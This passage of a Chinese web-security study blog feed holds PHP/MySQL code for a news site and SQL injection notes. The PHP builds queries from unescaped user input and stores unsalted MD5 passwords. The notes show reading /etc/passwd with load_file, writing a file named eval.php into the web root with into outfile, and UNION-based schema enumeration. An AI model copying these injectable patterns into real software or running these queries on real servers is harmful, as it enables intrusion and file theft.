`tb_anquan` WHERE `username`=&apos;$username&apos;;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">$result = mysql_query($sql) or die(mysql_error());</span><br><span class="line"></span><br><span class="line">$arr = mysql_fetch_assoc($result);</span><br><span class="line">$answer = $arr[&apos;mima&apos;];</span><br><span class="line">//echo $answer;</span><br><span class="line">//$inAnswer = $_POST[&apos;answer&apos;];</span><br><span class="line">if($answer != $_POST[&apos;answer&apos;])&#123;</span><br><span class="line">       die(&quot;&lt;script&gt;alert(&apos;密保答案不正确！&apos;);&lt;/script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$passFirst = $_POST[&apos;passwd&apos;];</span><br><span class="line">$passSecond = $_POST[&apos;passwdagain&apos;];</span><br><span class="line">if($passFirst==NULL &amp;&amp; $passSecond==NULL) &#123;</span><br><span class="line">    die(&quot;&lt;script&gt;alert(&apos;请输入密码！&apos;);&lt;/script&gt;&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if($passFirst != $passSecond)&#123;</span><br><span class="line">        die(&quot;&lt;script&gt;alert(&apos;输入密码不一致，请重新输入！&apos;);&lt;/script&gt;&quot;);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $passFirst = md5($passFirst);</span><br><span class="line">        $sql = &quot;UPDATE `tb_users` SET `password`= &apos;$passFirst&apos; WHERE `username`=&apos;$username&apos;;&quot;;</span><br><span class="line">        echo $sql;</span><br><span class="line">        $result = mysql_query($sql) or die(mysql_error());</span><br><span class="line">        if (mysql_affected_rows()) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;更新成功！&apos;);location.href=&apos;login.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&quot;&lt;script&gt;alert(&apos;更新失败！&apos;);location.href=&apos;findPasswd.php&apos;;&lt;/script&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="四、点赞功能"><a href="#四、点赞功能" class="headerlink" title="四、点赞功能"></a>四、点赞功能</h3><h4 id="up-down-php"><a href="#up-down-php" class="headerlink" title="up_down.php"></a>up_down.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style &gt;</span><br><span class="line">    .th&#123;</span><br><span class="line">        vertical-align: middle;</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;../js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    Require_once &quot;sql.php&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;width:100%;text-align:center&quot;&gt;</span><br><span class="line">    &lt;h1&gt;新闻界面&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;table align=&quot;center&quot; border=&quot;1&quot; width=&quot;1200&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;热度&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;标题&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;作者&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;时间&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">        &lt;th width=&quot;150px&quot;&gt; &lt;h2&gt;操作&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//$uers_id = $_SESSION[&quot;user_id&quot;];</span><br><span class="line">$user_id=13;</span><br><span class="line">$storeUidType = array();</span><br><span class="line">$result = mysql_query(&quot;select * from tb_news order by hot desc;&quot;);</span><br><span class="line">//======================================================================================</span><br><span class="line">$readNews = mysql_query(&quot;select * from `tb_hot` where `user_id`=$user_id&quot;);</span><br><span class="line">//把用户对新闻的评价保存在一个数组里</span><br><span class="line">//$storeUidType[news_id] = type</span><br><span class="line">while($arr1 = mysql_fetch_assoc($readNews)) &#123;</span><br><span class="line">    $hotUser_id = $arr1[&apos;user_id&apos;];</span><br><span class="line">    $hotNews_id = $arr1[&apos;news_id&apos;];</span><br><span class="line">    $hotType = $arr1[&apos;type&apos;];</span><br><span class="line">    $storeUidType[$hotNews_id] = $hotType;</span><br><span class="line">&#125;</span><br><span class="line">//echo $storeUidType;</span><br><span class="line">//======================================================================================</span><br><span class="line">while($arr = mysql_fetch_assoc($result))&#123;</span><br><span class="line">    $title = base64_decode($arr[&apos;title&apos;]);</span><br><span class="line">    //var_dump($title);</span><br><span class="line">    $contents = base64_decode($arr[&apos;contents&apos;]);</span><br><span class="line">    $author = base64_decode($arr[&apos;author&apos;]);</span><br><span class="line">    $new_img = $arr[&apos;new_img&apos;];</span><br><span class="line">    $add_time = $arr[&apos;add_time&apos;];</span><br><span class="line">    $Hot = $arr[&apos;hot&apos;];</span><br><span class="line">    //读取新闻ID</span><br><span class="line">    $id = $arr[&apos;id&apos;];</span><br><span class="line">    //=============================================</span><br><span class="line">    //用户还没有对新闻进行评价，颜色设置成黑色</span><br><span class="line">    if($storeUidType[$id]==1)&#123;</span><br><span class="line">        $upColor = &quot;red&quot;;</span><br><span class="line">        $downColor = &quot;black&quot;;</span><br><span class="line">    &#125;elseif($storeUidType[$id]==-1)&#123;</span><br><span class="line">        $upColor = &quot;black&quot;;</span><br><span class="line">        $downColor = &quot;red&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $upColor = &quot;black&quot;;</span><br><span class="line">        $downColor = &quot;black&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    //=============================================</span><br><span class="line">    $idUp = &apos;btnUp&apos; . $id;</span><br><span class="line">    $idDown = &apos;btnDown&apos; . $id;</span><br><span class="line">    $tu = base64_decode($new_img);</span><br><span class="line">    echo</span><br><span class="line">            &lt;&lt;&lt;EOF</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&#123;$Hot&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&#123;$title&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&#123;$author&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&#123;$add_time&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot; rowspan=&quot;2&quot;&gt;</span><br><span class="line">                &lt;p&gt;                  </span><br><span class="line">                    &lt;button id=$idUp style=&apos;color: $upColor&apos; onclick=&apos;btnUpAct(this.id)&apos;&gt;赞&lt;/button&gt;/</span><br><span class="line">                    &lt;button id=$idDown style=&apos;color: $downColor&apos; onclick=&apos;btnDownAct(this.id)&apos;&gt;踩&lt;/button&gt;                    </span><br><span class="line">                &lt;/p&gt;</span><br><span class="line">                </span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot; height: 30px; width: 300px; text-align: center;&gt;</span><br><span class="line">            &lt;img height=&quot;150px&quot; src=&#123;$tu&#125;&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td colspan=&quot;3&quot; align=&quot;center&quot; &gt;&lt;a href=&quot;xinwenzhanshimore.php?action=&#123;$title&#125;&quot;&gt;&#123;$contents&#125;&lt;/a&gt; </span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">             &lt;script&gt;</span><br><span class="line">                function btnUpAct(id)&#123;                   </span><br><span class="line">                    if(id==&apos;$idUp&apos;)&#123;</span><br><span class="line">                        if(document.getElementById(id).style.color == &quot;red&quot;)&#123;</span><br><span class="line">                            alert(&apos;您已点过赞了！&apos;);</span><br><span class="line">                        &#125;else&#123;</span><br><span class="line">                            document.getElementById(id).style.color=&quot;red&quot;;</span><br><span class="line">                            document.getElementById(&apos;$idDown&apos;).style.color=&quot;black&quot;; </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                function btnDownAct(id)&#123;</span><br><span class="line">                    if(id==&apos;$idDown&apos;)&#123;</span><br><span class="line">                        if(document.getElementById(id).style.color == &quot;red&quot;)&#123;</span><br><span class="line">                            alert(&apos;您已点过踩了！&apos;);</span><br><span class="line">                        &#125;else&#123;</span><br><span class="line">                            document.getElementById(id).style.color=&quot;red&quot;;</span><br><span class="line">                            document.getElementById(&apos;$idUp&apos;).style.color=&quot;black&quot;;        </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;               </span><br><span class="line">            &lt;/script&gt;</span><br><span class="line">EOF;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="五、问题与总结"><a href="#五、问题与总结" class="headerlink" title="五、问题与总结"></a>五、问题与总结</h3><p>新闻展示、个人信息、找回密码三个功能均可完美实现。点赞功能还是有些问题，从数据库中读取数据，新闻展示界面把该用户对每条新闻的赞踩显示出红色，在按钮添加事件，当颜色为红色时，再次点击该按钮会提示已操作过。用这种思路写出来，只是最后一条新闻功能实现是正确，后来查资料得知，<code>js</code>事件用于循环时只对最后一条有作用，需用闭包解决。需换思路！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 新闻管理系统新闻展示页面、个人信息、找回密码以及点赞功能编写。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="MySQL" scheme="http://yoursite.com/tags/MySQL/"/>
    
      <category term="新闻管理系统" scheme="http://yoursite.com/tags/%E6%96%B0%E9%97%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>note23</title>
    <link href="http://yoursite.com/2019/08/16/note23/"/>
    <id>http://yoursite.com/2019/08/16/note23/</id>
    <published>2019-08-16T13:50:13.000Z</published>
    <updated>2019-08-17T15:00:47.973Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 用PHP操作MySQL数据库</p><a id="more"></a><!--export--><h3 id="一、常用函数"><a href="#一、常用函数" class="headerlink" title="一、常用函数"></a>一、常用函数</h3><table><thead><tr><th>函数名称</th><th>作用</th></tr></thead><tbody><tr><td>mysql_connect(host, uname, passwd)</td><td>进行数据库连接</td></tr><tr><td>mysql_select_db(‘database’)</td><td>选择数据库</td></tr><tr><td>mysql_query(sql)</td><td>向数据库发送指令</td></tr><tr><td>mysql_fetch_array()</td><td>获取数据集中一行数据</td></tr><tr><td>mysql_fetch_row()</td><td>获取数字索引数组</td></tr><tr><td>mysql_fetch_assoc()</td><td>获取关联索引数组</td></tr></tbody></table><h3 id="二、循环遍历查询结果"><a href="#二、循环遍历查询结果" class="headerlink" title="二、循环遍历查询结果"></a>二、循环遍历查询结果</h3><h4 id="1-while"><a href="#1-while" class="headerlink" title="1. while"></a>1. while</h4><p><code>sql.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> $host = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$username = <span class="string">'root'</span>;</span><br><span class="line">$password = <span class="string">'root'</span>;</span><br><span class="line">@$con = mysql_connect($host, $username, $password) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); </span><br><span class="line">mysql_query(<span class="string">'set names "utf8"'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">'sql.php'</span>;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM `content`;"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($arr = mysql_fetch_assoc($result))&#123;</span><br><span class="line">        $title = $arr[<span class="string">'title'</span>];</span><br><span class="line">        $author = $arr[<span class="string">'author'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $author. <span class="string">'-&gt;'</span> . $title;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-for"><a href="#2-for" class="headerlink" title="2. for"></a>2. for</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'sql.php'</span>;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM `content`;"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;mysql_affected_rows(); $i++)&#123;</span><br><span class="line">        $arr = mysql_fetch_assoc($result);</span><br><span class="line">        $title = $arr[<span class="string">'title'</span>];</span><br><span class="line">        $author = $arr[<span class="string">'author'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $author. <span class="string">'-&gt;'</span> . $title;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="三、对密码的处理"><a href="#三、对密码的处理" class="headerlink" title="三、对密码的处理"></a>三、对密码的处理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//若$_SESSION['uname']为空则跳转到登录页面</span></span><br><span class="line"><span class="keyword">if</span>(!$_SESSION(<span class="string">'uname'</span>))&#123;</span><br><span class="line">        header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">@$old_pass = $_POST[<span class="string">'old_pass'</span>];</span><br><span class="line">@$new_pass = $_POST[<span class="string">'new_pass'</span>];</span><br><span class="line">@$new_pass_again = $_POST[<span class="string">'new_pass_again'</span>];</span><br><span class="line"><span class="keyword">if</span>($old_pass &amp;&amp; $new_pass &amp;&amp; $new_pass_again)&#123;</span><br><span class="line">        <span class="keyword">if</span>($new_pass != $new_pass_again)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;script&gt;alert('两次输入密码不一致，请重新输入!')&lt;/script&gt;"</span>)；</span><br><span class="line">        &#125;</span><br><span class="line">     $pass = md5($new_pass);</span><br><span class="line">        $uid = $_SESSION[<span class="string">'uid'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'sql.php'</span>;</span><br><span class="line">        $sql = <span class="string">"UPDATE `users` SET `passwd` = '&#123;$pass&#125;' WHERE `id`=&#123;$uid&#125;;"</span>;</span><br><span class="line">        $result = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(mysql_affected_rows())&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("密码修改成功！");&lt;/script&gt;'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("密码修改成功！");&lt;/script&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 用PHP操作MySQL数据库&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="MySQL" scheme="http://yoursite.com/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>note22</title>
    <link href="http://yoursite.com/2019/08/13/note22/"/>
    <id>http://yoursite.com/2019/08/13/note22/</id>
    <published>2019-08-13T09:30:39.000Z</published>
    <updated>2019-08-17T03:31:59.812Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: MYSQL常用函数的讲解</p><a id="more"></a><!--export--><h3 id="一、常用函数"><a href="#一、常用函数" class="headerlink" title="一、常用函数"></a>一、常用函数</h3><table><thead><tr><th>函数名</th><th>作用</th></tr></thead><tbody><tr><td>version()</td><td>返回数据库的版本号</td></tr><tr><td>database()</td><td>返回当前数据库名</td></tr><tr><td>user()</td><td>返回当前用户</td></tr><tr><td>system_user()</td><td>返回当前用户</td></tr></tbody></table><ul><li>concat(s1, s2, …, sn)字符串s1，s2等多个字符串合并为一个字符串。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- MY SQL FUNCTION</span><br><span class="line">SELECT CONCAT(&quot;MY &quot;, &quot;SQL &quot;, &quot;FUNCTION &quot;);</span><br></pre></td></tr></table></figure><ul><li>concat_ws(x, s1, s1, …, sn)把字符串合并成一个字符串，两两间以x连接。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- I-LOVE-SQL</span><br><span class="line">SELECT CONCAT_WS(&quot;-&quot;, &quot;I&quot;, &quot;LOVE&quot;, &quot;SQL&quot;);</span><br></pre></td></tr></table></figure><ul><li>group_concat(s1, ‘ ‘, s2  )返回一个字符串结果，该结果由分组中的值连接组合而成。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(username, &apos;-&apos;, passwd) FROM `USERS`;</span><br></pre></td></tr></table></figure><ul><li>left(s, n)返回字符串s前n个字符。 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- hello</span><br><span class="line">SELECT LEFT(&apos;hello world&apos;, 5);</span><br><span class="line">-- helllo w</span><br><span class="line">SELECT LEFT(&apos;hello world&apos;, 7);</span><br></pre></td></tr></table></figure><ul><li>right(s, n)返回字符串s的后n个字符。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- o world</span><br><span class="line">SELECT RIGHT(&apos;hello world&apos;, 7);</span><br></pre></td></tr></table></figure><ul><li>substr/substring(s, start, length)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- o </span><br><span class="line">SELECT SUBSTR(&apos;hello world&apos;, 5, 2);</span><br><span class="line">SELECT SUBSTRING(&apos;hello world&apos;, 5, 2);</span><br><span class="line">-- o wo</span><br><span class="line">SELECT SUBSTR(&apos;hello world&apos;, 5, 4);</span><br><span class="line">SELECT SUBSTRING(&apos;hello world&apos;, 5, 4);</span><br></pre></td></tr></table></figure><ul><li>mid(s, n, len)从字符串s的start位置截取长度为length的子字符串</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- o w</span><br><span class="line">SELECT MID(&apos;hello world&apos;, 5, 3);</span><br></pre></td></tr></table></figure><ul><li>DISTINCT 过虑重复的记录</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT name FROM user;</span><br></pre></td></tr></table></figure><ul><li>UNION操作符用于合并两个或多个SELECT语句的结果集</li></ul><p><strong>NOTE</strong>: UNION内部的每个SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型。UNION在进行表连接后会筛选掉重复的记录，UNION ALL只是简单的将两个结果合并后返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段名 FROM 表1 UNION SELECT 字段名 FROM 表2</span><br></pre></td></tr></table></figure><ul><li><p>ORDER BY在SQL注入中用于判断字段数，然后用UNION用于输出信息。</p></li><li><p>LIKE</p></li></ul><table><thead><tr><th>操作符</th><th>左右</th></tr></thead><tbody><tr><td>_</td><td>代表任意单个字符</td></tr><tr><td>%</td><td>代表任意多字符</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;b%&apos;;</span><br><span class="line">SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;%o%&apos;;</span><br><span class="line">SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;admi_&apos;;</span><br><span class="line">-- 把标题中含有1作者名含有1值含有1的数据列出</span><br><span class="line">SELECT * FROM test.content WHERE title LIKE &apos;%1%&apos; or author like &apos;%1%&apos; or value like %1%&apos;&apos;</span><br></pre></td></tr></table></figure><p><code>like</code>  <code>%q%</code>包含q的      <code>%q</code> q在结尾      <code>q%</code>   q在开头</p><h3 id="二、读写文件"><a href="#二、读写文件" class="headerlink" title="二、读写文件"></a>二、读写文件</h3><h4 id="1-写文件"><a href="#1-写文件" class="headerlink" title="1. 写文件"></a>1. 写文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 绝对路径</span><br><span class="line">into dumpfile &quot;filepath&quot;</span><br><span class="line">-- 绝对路径</span><br><span class="line">into outfile &quot;filepath&quot;</span><br><span class="line">select 123 into outfile/dumpfile &apos;/var/www/html/eval.php&apos;;</span><br></pre></td></tr></table></figure><h4 id="2-读文件"><a href="#2-读文件" class="headerlink" title="2. 读文件"></a>2. 读文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-- 绝对路径</span><br><span class="line">load_file(&apos;filepath&apos;)</span><br><span class="line">select load_file(&apos;/etc/passwd&apos;);</span><br><span class="line">create table data(</span><br><span class="line">data text</span><br><span class="line">)</span><br><span class="line">insert into data values(load_file(&apos;&apos;));</span><br></pre></td></tr></table></figure><p>load file: 读取文件并以字符串形式返回文件内容。</p><p>into outfile: 将所选行写入文件，该文件会在服务器主机上进行创建，所以你必须要有执行这条命令的权限，还要注意要写入文件不能是现有的文件。如：/etc/passwd</p><p><em>以下内容不太懂，先记住</em></p><p>文件转十六进制，然后unhexo into dumpfile</p><p>本地使用hex(load file(‘path’))处理二进制文件</p><p>服务器上，执行select unhex(0x十六进制内容) into dumpfile “/tmp/a.exe”</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: MYSQL常用函数的讲解&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="MySQL" scheme="http://yoursite.com/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>练习7</title>
    <link href="http://yoursite.com/2019/08/13/practice7/"/>
    <id>http://yoursite.com/2019/08/13/practice7/</id>
    <published>2019-08-13T09:01:59.000Z</published>
    <updated>2019-08-13T11:59:59.131Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 先在数据库中使用<code>UNION</code>写<code>SQL</code>查出数据库版本，库，表，列等信息，再在<code>index.php</code>中操作一遍。</p><a id="more"></a><!--export--><h3 id="一、首先确定列数"><a href="#一、首先确定列数" class="headerlink" title="一、首先确定列数"></a>一、首先确定列数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 先用order by根据是否报错确定列数</span><br><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 4;</span><br><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 5;</span><br><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 6;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/orderBy.png" alt></p><p>由输出结果可知，共有五列。</p><h3 id="二、读取数据"><a href="#二、读取数据" class="headerlink" title="二、读取数据"></a>二、读取数据</h3><h4 id="1-确定库名"><a href="#1-确定库名" class="headerlink" title="1. 确定库名"></a>1. 确定库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT version(), 